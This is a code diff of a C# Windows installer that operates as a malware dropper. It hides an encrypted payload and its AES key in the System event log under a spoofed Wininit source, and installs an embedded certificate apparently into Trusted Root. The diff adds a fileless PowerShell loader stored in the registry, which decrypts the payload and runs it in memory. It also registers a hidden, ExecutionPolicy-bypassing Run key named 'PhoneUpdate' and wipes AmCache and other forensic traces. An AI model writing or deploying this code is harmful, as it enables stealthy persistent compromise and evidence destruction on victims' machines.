@@ -1,5 +1,4 @@
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -16,8 +15,6 @@ class P
     [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int MessageBox(IntPtr h, string t, string c, uint t2);
     const int SW = 5;
     const string SRC = "Microsoft-Windows-Wininit";
-    const string FN = "UpdateFilter";
-    const string CN = "UpdateConsumer";
     static int[] SC = new int[] { 18, 19, 20, 21, 22 };
 
     static void Main(string[] ax)
@@ -35,7 +32,7 @@ class P
             byte[] ak = new byte[32]; byte[] iv = new byte[16];
             using (var r = new RNGCryptoServiceProvider()) { r.GetBytes(ak); r.GetBytes(iv); }
 
-            Console.WriteLine("Writing key to event log...");
+            Console.WriteLine("Writing keys to event log...");
             ES();
             WE(18, GU(ak.Skip(0).Take(16).ToArray()));
             WE(19, GU(ak.Skip(16).Take(16).ToArray()));
@@ -58,7 +55,7 @@ class P
             }
             Console.WriteLine("Chunks written (" + ci + " chunks)");
 
-            Console.WriteLine("Installing certificate to Trusted Root...");
+            Console.WriteLine("Installing certificate...");
             byte[] pfxBytes;
             using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("MorganTools.pfx"))
             { pfxBytes = new byte[s.Length]; s.Read(pfxBytes, 0, pfxBytes.Length); }
@@ -69,18 +66,19 @@ class P
             store.Close();
             Console.WriteLine("Certificate installed: " + pfx.Subject);
 
-            Console.WriteLine("Deploying loader...");
-            string exePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "PhoneUpdate.exe");
-            byte[] loaderExe;
-            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("loader.exe"))
-            { loaderExe = new byte[s.Length]; s.Read(loaderExe, 0, loaderExe.Length); }
-            File.WriteAllBytes(exePath, loaderExe);
-            Console.WriteLine("Loader deployed: " + exePath);
+            Console.WriteLine("Writing loader to registry...");
+            string loaderScript = BuildLoader();
+            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\PhoneUpdate"))
+            {
+                key.SetValue("Loader", loaderScript, Microsoft.Win32.RegistryValueKind.String);
+            }
+            Console.WriteLine("Loader stored in registry");
 
             Console.WriteLine("Registering Run key...");
+            string runCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (Get-ItemProperty 'HKCU:\\Software\\PhoneUpdate').Loader\"";
             using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
             {
-                key.SetValue("PhoneUpdate", exePath);
+                key.SetValue("PhoneUpdate", runCmd, Microsoft.Win32.RegistryValueKind.String);
             }
             Console.WriteLine("Run key registered");
 
@@ -91,13 +89,61 @@ class P
             Console.WriteLine("Artifacts cleared");
 
             Console.WriteLine("Successful");
-            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nLoader: System32\\PhoneUpdate.exe\nRun key: HKCU\\...\\Run\\PhoneUpdate\nArtifacts: cleared", "Done", 0x40);
+            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nArtifacts: event log + registry only\nZero files on disk", "Done", 0x40);
         }
         catch (Exception ex)
         {
             Console.WriteLine("Failed: " + ex.Message);
             MessageBox(IntPtr.Zero, "Setup failed:\n" + ex.Message, "Error", 0x10);
         }
+    }
+
+    static string BuildLoader()
+    {
+        // PowerShell loader — reads event log, decrypts payload, executes in memory
+        // stored in registry, no files on disk
+        StringBuilder sb = new StringBuilder();
+        sb.Append("$e='Microsoft-Windows-Wininit';");
+        sb.Append("$c=@{};");
+        sb.Append("$k1=$null;$k2=$null;$iv=$null;");
+        // collect LC: chunks
+        sb.Append("Get-EventLog -LogName System -Source $e -Newest 2000 -EA SilentlyContinue | ");
+        sb.Append("? {$_.Message -match '^LC:'} | % {");
+        sb.Append("$m=$_.Message.Substring(3);$p=$m.IndexOf(':');");
+        sb.Append("$i=[int]$m.Substring(0,$p);$c[$i]=$m.Substring($p+1)};");
+        // collect keys
+        sb.Append("$k1=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 18} | Select -First 1).Message;");
+        sb.Append("$k2=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 19} | Select -First 1).Message;");
+        sb.Append("$iv=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 20} | Select -First 1).Message;");
+        // validate
+        sb.Append("if(!$k1 -or !$k2 -or !$iv){return}");
+        // reassemble chunks in order
+        sb.Append("$buf=New-Object System.Text.StringBuilder;");
+        sb.Append("($c.Keys | Sort-Object) | % {$buf.Append($c[$_]) | Out-Null};");
+        // decode base64
+        sb.Append("$enc=[Convert]::FromBase64String($buf.ToString());");
+        // GUID parser helper
+        sb.Append("$g={param($s)$s=$s.Trim().Trim('{}').Replace('-','');");
+        sb.Append("$b=New-Object byte[](16);");
+        sb.Append("for($i=0;$i -lt 16){$b[$i]=[Convert]::ToByte($s.Substring($i*2,2),16)};");
+        sb.Append("return $b};");
+        // reconstruct AES key and IV
+        sb.Append("$ak=New-Object byte[](32);");
+        sb.Append("[Array]::Copy($g.Invoke($k1),0,$ak,0,16);");
+        sb.Append("[Array]::Copy($g.Invoke($k2),0,$ak,16,16);");
+        // decrypt
+        sb.Append("$a=[Security.Cryptography.Aes]::Create();");
+        sb.Append("$a.Key=$ak;$a.IV=$g.Invoke($iv);");
+        sb.Append("$a.Mode='CBC';$a.Padding='PKCS7';");
+        sb.Append("$d=$a.CreateDecryptor();");
+        sb.Append("$dec=$d.TransformFinalBlock($enc,0,$enc.Length);");
+        sb.Append("$a.Dispose();");
+        // load and execute
+        sb.Append("$asm=[Reflection.Assembly]::Load($dec);");
+        sb.Append("$t=$asm.GetType('Program');");
+        sb.Append("if($t){$m=$t.GetMethod('Main',[Reflection.BindingFlags]'Static,Public,NonPublic');");
+        sb.Append("if($m){$m.Invoke($null,@(,[String[]]@()))}};");
+        return sb.ToString();
     }
 
     static void ES() { try { EventLog.CreateEventSource(SRC, "System"); } catch { } }
@@ -129,9 +175,7 @@ class P
                 {
                     string val = key.GetValue(valName, "") as string;
                     if (val != null && val.ToLower().Contains(exeName.ToLower()))
-                    {
                         try { key.DeleteValue(valName); } catch { }
-                    }
                 }
             }
             Console.WriteLine("AmCache: cleared");
@@ -156,9 +200,7 @@ class P
                         {
                             string val = sidKey.GetValue(valName, "") as string;
                             if (val != null && val.ToLower().Contains(exeName.ToLower()))
-                            {
                                 try { sidKey.DeleteValue(valName); } catch { }
-                            }
                         }
                     }
                 }
